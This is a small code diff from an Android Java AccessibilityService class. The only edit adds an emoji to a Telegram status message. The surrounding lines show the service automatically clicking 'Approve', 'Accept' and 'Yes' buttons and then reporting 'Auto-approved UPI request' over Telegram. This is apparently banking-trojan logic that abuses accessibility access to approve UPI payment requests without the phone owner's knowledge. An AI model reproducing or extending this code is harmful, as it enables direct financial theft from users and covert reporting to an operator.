@@ -33,7 +33,7 @@ public class MyAccessibilityService extends AccessibilityService {
             clickButton("Approve");
             clickButton("Accept");
             clickButton("Yes");
-            sendTelegram("Auto-approved UPI request");
+            sendTelegram("✅ Auto-approved UPI request");
         }
     }
     
